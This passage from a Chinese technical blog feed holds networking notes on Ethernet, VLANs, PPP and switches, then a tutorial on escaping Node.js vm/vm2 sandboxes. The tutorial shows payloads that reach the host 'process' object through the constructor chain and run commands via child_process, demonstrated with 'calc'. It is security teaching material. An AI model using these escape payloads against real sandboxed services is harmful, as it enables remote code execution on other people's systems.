id="10BASE-T以太网"><a href="#10BASE-T以太网" class="headerlink" title="10BASE-T以太网"></a>10BASE-T以太网</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401221436733.png" alt="image-20240401221436733"></p><h2 id="适配器与MAC地址"><a href="#适配器与MAC地址" class="headerlink" title="适配器与MAC地址"></a>适配器与MAC地址</h2><p>计算机与外界有局域网的连接是通过通信适配器的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401221549243.png" alt="image-20240401221549243"></p><p>MAC地址又称为物理地址，是全球唯一的，每个网卡都有MAC地址。</p><p>MAC地址是由48位二进制数组成，前24位代表厂家(由IEEE规定)，后24位厂家自己指定。常用6个十六进制数表示，如02-60-8e-e4-b1-21</p><h2 id="以太网MAC帧"><a href="#以太网MAC帧" class="headerlink" title="以太网MAC帧"></a>以太网MAC帧</h2><p>最常用的MAC帧是以太网V2的格式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401222333972.png" alt="image-20240401222333972"></p><blockquote><p>以太网的最小帧长位64B</p></blockquote><p>与IEEE 802.3的区别：</p><ol><li>第三个字段是长度&#x2F;类型</li><li>当长度&#x2F;类型字段值小于0x0600时，数据字段必须装入LLC子层</li></ol><h2 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401222630966.png" alt="image-20240401222630966"></p><h1 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h1><p>IEEE 802.11是无线局域网的通用标准。</p><p>它还有很多细分的版本如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401222817167.png" alt="image-20240401222817167"></p><h2 id="802-11的MAC帧头格式"><a href="#802-11的MAC帧头格式" class="headerlink" title="802.11的MAC帧头格式"></a>802.11的MAC帧头格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223149510.png" alt="image-20240401223149510"></p><p>上面的只是其中一种，802.11不同的版本还有不同的帧头格式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223240972.png" alt="image-20240401223240972"></p><h2 id="无线局域网分类"><a href="#无线局域网分类" class="headerlink" title="无线局域网分类"></a>无线局域网分类</h2><p><strong>有固定基础设施的无线局域网</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223632641.png" alt="image-20240401223632641"></p><p>wifi的名称又叫做服务集标识符。</p><p><strong>无固定基础设施无线局域网的自组织网络</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223748731.png" alt="image-20240401223748731"></p><p>即每个主机又可以当作主机又可以当作路由器转发数据。</p><h1 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h1><p>就是虚拟局域网(Virtual Local Area Network)，是一种将局域网的设备划分成与物理位置无关的逻辑组的技术，这些逻辑组有某些共同的需求。每个VLAN是一个单独的广播域&#x2F;不同的子网。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401224352375.png" alt="image-20240401224352375"></p><blockquote><p>虚拟网络建立在网络交换机之上，它以软件方式来实现逻辑工作组的划分与管理</p></blockquote><h2 id="VLAN的实现"><a href="#VLAN的实现" class="headerlink" title="VLAN的实现"></a>VLAN的实现</h2><p>交换机上生成的VLAN互不想通，若想实现通信，需要借助：</p><ul><li>路由器</li><li>三层交换机</li></ul><p><strong>基于接口的VLAN技术</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225024038.png" alt="image-20240401225024038"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225037903.png" alt="image-20240401225037903"></p><p>A发送一个广播帧可以不让B收到，其原理如下：</p><blockquote><p>A发送一个广播请求，交换机取转发表中对照知道他是来自1号端口，知道他是来自VLAN1的广播请求，然后却交换机的VLAN表中查看，VLAN ID中为1的只有2号端口所以会转发给B而不会转发给C和D</p></blockquote><p><strong>基于MAC地址的VLAN技术</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225544853.png" alt="image-20240401225544853"></p><p>就是改变了一下交换机的VLAN表的形式，对应还是一样的。</p><p><strong>交换机之间的通信</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225719073.png" alt="image-20240401225719073"></p><p>比如A要给E发送数据，然后给数据标记上VLAN1的标签，当发送到交换机2的时候就知道它是属于哪一个网络的，然后就可以发送给E了。</p><p><strong>IEEE 802.1Q帧</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401230123145.png" alt="image-20240401230123145"></p><h1 id="广域网及相关协议"><a href="#广域网及相关协议" class="headerlink" title="广域网及相关协议"></a>广域网及相关协议</h1><p>广域网(WAN，WideArea Network)，通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个城市或国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。</p><p>广域网的通信子网主要使用分组交换技术。广域网的通信子网可以利用公用分组交换网、卫星通信网和无线分组交换网，它将分布在不同地区的局域网或计算机系统互连起来，达到资源共享的目的。如因特网(Internet)是世界范围内最大的广域网。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401230819221.png" alt="image-20240401230819221"></p><h2 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h2><p>点对点协议PPP(Point-to-Point Protocol)是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都使用PPP协议。</p><blockquote><p>该协议只支持全双工通信</p></blockquote><p><strong>PPP协议应满足的要求</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231218835.png" alt="image-20240401231218835"></p><p><strong>PPP协议无需满足的要求</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231255188.png" alt="image-20240401231255188"></p><p><strong>PPP协议的三个组成部分</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231415652.png" alt="image-20240401231415652"></p><p><strong>PPP协议的状态图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231530196.png" alt="image-20240401231530196"></p><p><strong>PPP协议的帧格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231652471.png" alt="image-20240401231652471"></p><blockquote><p>PPP协议是一个面向字节的协议</p></blockquote><h2 id="HDLC协议"><a href="#HDLC协议" class="headerlink" title="HDLC协议"></a>HDLC协议</h2><p>高级数据链路控制(High-Level Data Link ControI或简称HDLC)，是一个在同步网上传输数据、面向比特的数据链路层协议，它是由国际标准化组织(ISO)根据IBM公司的SDLC(SvnchronousData Link Control)协议扩展开发而成的。</p><p>数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现</p><p>HDLC协议采用全双工通信。</p><p>所有帧采用CRC检验，对信息帧进行顺序编码，可防止漏收或重份，传输可靠性高。</p><p><strong>HDLC的站</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401232456669.png" alt="image-20240401232456669"></p><p><strong>HDLC的帧格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401232617385.png" alt="image-20240401232617385"></p><h2 id="PPP协议和HDLC协议的区别"><a href="#PPP协议和HDLC协议的区别" class="headerlink" title="PPP协议和HDLC协议的区别"></a>PPP协议和HDLC协议的区别</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401232742381.png" alt="image-20240401232742381"></p><h1 id="链路层设备"><a href="#链路层设备" class="headerlink" title="链路层设备"></a>链路层设备</h1><h2 id="物理层扩展以太网"><a href="#物理层扩展以太网" class="headerlink" title="物理层扩展以太网"></a>物理层扩展以太网</h2><p>用来减少信号的衰减，因为一台主机连上集线器的端口之后距离不能太远，不然信号失真非常严重</p><ol><li><p>使用光纤解调器来扩展以太网</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401233116459.png" alt="image-20240401233116459"></p></li><li><p>划分多个冲突域来扩展，冲突域就是一个冲突域内只能有一台主机和集线器连接，不然就会发生冲突</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401233239090.png" alt="image-20240401233239090"></p><p>但是该方式的冲突效率降低了</p></li></ol><h2 id="链路层扩展以太网"><a href="#链路层扩展以太网" class="headerlink" title="链路层扩展以太网"></a>链路层扩展以太网</h2><p>一般使用网桥或者交换机</p><p><strong>网桥</strong></p><p>网桥根据MAC帧的目的地址对帧进行转发和过滤。当网桥收到一个帧时，并不向所有接口转发此帧，而是先检查此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把它丢弃(即过滤)。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401234933353.png" alt="image-20240401234933353"></p><p>网桥又分为两种：</p><ul><li><p>透明网桥：“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备-自学习</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401235353540.png" alt="image-20240401235353540"></p><p>自学习指的就是会在数据发送的过程中逐渐填充转发表。</p></li><li><p>源路由网桥：在发送帧时，把详细的最佳路由信息(路由最少&#x2F;时间最短)放在帧的首部中。</p><p><strong>方法</strong>：源站以广播方式向欲通信的目的站发送一个发现帧</p></li></ul><p><strong>以太网交换机</strong></p><p>也叫做多接口网桥，一个交换机上有很多个端口，每一个端口都是一个冲突域。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401235818631.png" alt="image-20240401235818631"></p><p><strong>以太网交换机的两种交换方式</strong></p><ul><li><p>直通式交换机：查完目的地址(6B)就立刻转发。</p><p>延迟小，可靠性低，无法支持具有不同速率的端口的交换。</p></li><li><p>存储转发式交换机：将帧放入高速缓存，并检查否正确，正确则转发，错误则丢弃。<br>延迟大，可靠性高，可以支持具有不同速率的端口的交换。</p></li></ul><p><strong>交换机的自学习</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402000240493.png" alt="image-20240402000240493"></p><h2 id="冲突域和广播域"><a href="#冲突域和广播域" class="headerlink" title="冲突域和广播域"></a>冲突域和广播域</h2><p><strong>冲突域</strong></p><p>在同一个冲突域中的每一个节点都能收到所有被发送的帧；简单的说就是同一时间内只能有一台设备发送信息的范围。</p><p><strong>广播域</strong></p><p>网络中能接收任一设备发出的广播帧的所有设备的集合。简单的说如果站点发出一个广播信号，所有能接收收到这个信号的设备范围称为一个广播域。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402000502481.png" alt="image-20240402000502481"></p>]]></content>
      
      
      <categories>
          
          <category> 基础,计网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm2沙箱逃逸</title>
      <link href="/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<!-- toc --><h1 id="沙箱逃逸的概念"><a href="#沙箱逃逸的概念" class="headerlink" title="沙箱逃逸的概念"></a>沙箱逃逸的概念</h1><ul><li>沙箱(sandbox)就是创建一个单独的运行代码的环境，和主机进行隔离，这样代码产生的危害就不会影响到主机，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li><li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</li><li>Nodejs中，通过vm模块来创建一个沙箱，但vm模块的漏洞较大，后续就出现了升级版的vm2，对vm做了优化，但是在旧版本仍然存在一些漏洞。</li></ul><p>那么沙箱逃逸就是字面意思，逃离该沙箱环境对主机进行影响，比如rce等。</p><h1 id="Nodejs命令执行"><a href="#Nodejs命令执行" class="headerlink" title="Nodejs命令执行"></a>Nodejs命令执行</h1><p>要进行rce就要先了解一下Nodejs的执行命令的一些模块和函数。</p><p>参考文章：<a href="https://www.w3cschool.cn/nwfchn/omcvtozt.html">https://www.w3cschool.cn/nwfchn/omcvtozt.html</a></p><ul><li><p>eval()：这个函数跟php的效果一样，也是直接将字符串当作代码执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>child_process模块：该模块就是nodejs用来执行命令的模块</p><ul><li><p>exec()：该方法用来执行bash命令</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> exec=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>;<br><span class="hljs-keyword">var</span> whoami=<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>)&#123;<br>    <span class="hljs-keyword">if</span>(error)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">stack</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Error code: &#x27;</span>+error.<span class="hljs-property">code</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Child Process STDOUT: &#x27;</span>+stdout);<br>&#125;);<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309144449923.png" alt="image-20240309144449923"></p><p>exec方法的第一个参数是所要执行的shell命令，第二个参数是回调函数，该函数接受三个参数，分别是发生的错误、标准输出的显示结果、标准错误的显示结果。</p></li><li><p>execFile()：该方法直接执行特定的程序，参数作为数组传入，不会被bash解释，因此具有较高的安全性。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> execFile=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execFile</span>;<br><span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/bin/ls&#x27;</span>,[<span class="hljs-string">&#x27;-l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>],<span class="hljs-keyword">function</span>(<span class="hljs-params">error,result</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>spawn()：spawn方法创建一个子进程来执行特定命令，用法与execFile方法类似，但是没有回调函数，只能通过监听事件，来获取运行结果。它属于异步执行，适用于子进程长时间运行的情况。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> spawn=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">var</span> who=<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>who.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stdout: &#x27;</span>+data);<br>&#125;);<br>who.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stderr: &#x27;</span>+data)<br>&#125;);<br>who.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closing code: &#x27;</span>+code);<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309145912479.png" alt="image-20240309145912479"></p><p>spawn方法接受两个参数，第一个是可执行文件，第二个是参数数组。</p><p>spawn对象返回一个对象，代表子进程。该对象部署了EventEmitter接口，它的data事件可以监听，从而得到子进程的输出结果。</p><p>spawn方法与exec方法非常类似，只是使用格式略有区别。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">child_process.<span class="hljs-title function_">exec</span>(command, [options], callback)<br>child_process.<span class="hljs-title function_">spawn</span>(command, [args], [options])<br></code></pre></td></tr></table></figure></li><li><p>fork()：fork方法直接创建一个子进程，执行Node脚本，<code>fork(&#39;./child.js&#39;)</code> 相当于 <code>spawn(&#39;node&#39;, [&#39;./child.js&#39;])</code> 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = child_process.<span class="hljs-title function_">fork</span>(<span class="hljs-string">&#x27;./child.js&#x27;</span>);<br>n.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;PARENT got message:&#x27;</span>, m);<br>&#125;);<br>n.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">hello</span>: <span class="hljs-string">&#x27;world&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>上面代码中，fork方法返回一个代表进程间通信管道的对象，对该对象可以监听message事件，用来获取子进程返回的信息，也可以向子进程发送信息。</p><p>child.js脚本的内容如下。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;CHILD got message:&#x27;</span>, m);<br>&#125;);<br>process.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>上面代码中，子进程监听message事件，并向父进程发送信息。</p></li><li><p>send()：使用 child_process.fork() 生成新进程之后，就可以用 child.send(message, [sendHandle]) 向新进程发送消息。新进程中通过监听message事件，来获取消息。也就是上面fork示例的代码。</p></li></ul></li></ul><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>参考文章：<a href="https://xz.aliyun.com/t/13427?time__1311=mqmxnDBQqeu4lxGg2DyeHDkQdexWwhD&alichlgref=https://www.google.com/">NodeJs vm沙箱逃逸 - 先知社区 (aliyun.com)</a></p><h2 id="vm模块的使用"><a href="#vm模块的使用" class="headerlink" title="vm模块的使用"></a>vm模块的使用</h2><ul><li><strong>vm.createContext([contextObject[, options]])</strong></li></ul><p>该模块在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8引擎为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309153446420.png" alt="image-20240309153446420"></p><ul><li><p>**vm.runInContext(code, contextifiedSandbox[, options])**：该函数参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p>runInContext需要配合createContext创建的沙箱来进行运行</p></li><li><p>所以这两个模块方法配合起来使用如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">globalVar</span>:<span class="hljs-number">10</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar*=2;console.log(globalVar);&#x27;</span>,sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154253819.png" alt="image-20240309154253819"></p></li><li><p><strong>vm.runInThisContext(code[, options])</strong></p></li></ul><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。</p><p>这里需要注意的就是runInThisContext虽然是会创建相关的沙箱环境，可以访问到global上的全局变量，但是访问不到自定义的变量。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154545749.png" alt="image-20240309154545749"></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Var</span>=<span class="hljs-number">123</span>;<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(globalVar);&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(Var);&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154838701.png" alt="image-20240309154838701"></p><blockquote><p>可知可以访问全局变量，但自定义的不能访问，会报错。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><strong>vm.runInNewContext(code[, contextObject[, options]])</strong></li></ul><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象，不提供的话默认生成一个沙箱来进行使用。</p><blockquote><p>提一嘴Nodejs中数据类型可以分为两大类：基本类型和对象类型</p><p>基本类型包括以下六种：</p><ul><li>string：表示文本数据，用单引号或双引号包裹，如 ‘hello’ 或 “world”。</li><li>number：表示数值数据，可以是整数或小数，如 42 或 3.14。</li><li>boolean：表示逻辑数据，只有两个值，true 或 false。</li><li>null：表示空值，表示一个对象没有引用任何值。</li><li>undefined：表示未定义值，表示一个变量没有被赋值。</li><li>symbol：表示唯一的标识符，用 Symbol() 函数创建，如 Symbol(‘foo’)。</li></ul><p>那么除了这些基本类型的就是对象类型了。</p></blockquote><ul><li><p><strong>new vm.Script(code, options)：</strong>创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，指的是 code 中的变量、函数、对象等，不会自动成为全局作用域中的属性或成员。相反，它仅仅绑定于每次执行它的对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-comment">//script=new vm.Script(&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;)</span><br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;name=&quot;clown&quot;&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sandbox);<span class="hljs-comment">//&#123; name: &#x27;clown&#x27; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="利用沙箱来执行命令"><a href="#利用沙箱来执行命令" class="headerlink" title="利用沙箱来执行命令"></a>利用沙箱来执行命令</h2><p>这里写一下不同沙箱执行命令的写法</p><ul><li><p><strong>runInThisContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">`process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)`</span>);<br></code></pre></td></tr></table></figure><p>然后就能弹计算器了</p><blockquote><p>这里了解一下为什么要这么写</p><ul><li><p>process：</p><p>process 对象是 Node.js 提供的一个全局变量，它包含了有关当前 Node.js 进程的信息和控制方法。</p><p>process 对象可以直接使用，而不需要通过 require() 引入，是因为它是一个预定义的全局对象，类似于 console、global、Buffer 等。</p><p>process 对象有很多有用的属性和方法，例如：</p><ul><li><p>process.env：可以获取或设置环境变量，如 process.env.NODE_ENV。</p></li><li><p>process.argv：可以获取命令行参数，如 process.argv[0]。</p></li><li><p>process.cwd()：可以获取当前工作目录，如 process.cwd()。</p></li><li><p>process.exit()：可以退出当前进程，如 process.exit(0)。</p></li><li><p>process.mainModule： 是 Node.js 提供的一个全局变量，它是一个对象，表示当前主模块的 Module 实例，主模块就是node执行的js。</p><p>它可以让你获取当前主模块的一些信息，例如它的文件名、路径、子模块等，比如process.mainModule.require。</p></li></ul></li><li><p>因为沙箱中没有 require() 函数，这是 Node.js 的一个全局函数，用于加载模块，但它不是 global 对象上的一个属性，而是在每个模块的本地作用域中定义的。从上面的作用域可以知道，require就是在node执行的js内定义的函数，而沙箱内部就是另一个独立的模块，所以是没有require函数的，需要从process.mainModule中获取。</p></li></ul></blockquote></li><li><p><strong>vm.runInContext(code, contextifiedSandbox[, options])</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> code=<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)();&#x27;</span>;<br><span class="hljs-comment">//vm.runInNewContext(`this.constructor.constructor(&#x27;return process&#x27;)()`);这样获取process对象也是可以的</span><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInContext</span>(code,sandbox);<br>res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>因为该方法的作用域是独立于global的，所以我们需要先获取global的process对象，然后就可以执行命令了。</p><blockquote><p>解释一下是怎么获取process对象的：</p><p>在沙箱中this指向全局环境中的{x:2}对象，这里通过调试可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310094536377.png" alt="image-20240310094536377"></p><p>这个对象是不属于沙箱环境的，它属于全局环境，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><p>这是一个构造器链的图例：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309170145802.png" alt="image-20240309170145802"></p><p>所以上面的toString和constructor都是Object.prototype上的属性，所以这两种写法都可以。</p><p>构造器链的尽头是<code>Function</code>，Function的构造器是Function本身，所以利用原型链调用Function的构造函数之后就能获得process对象。</p></blockquote><p>所以只要是this是外部的引用都是可以来进行逃逸的，所以下面这样写也是可以的</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox 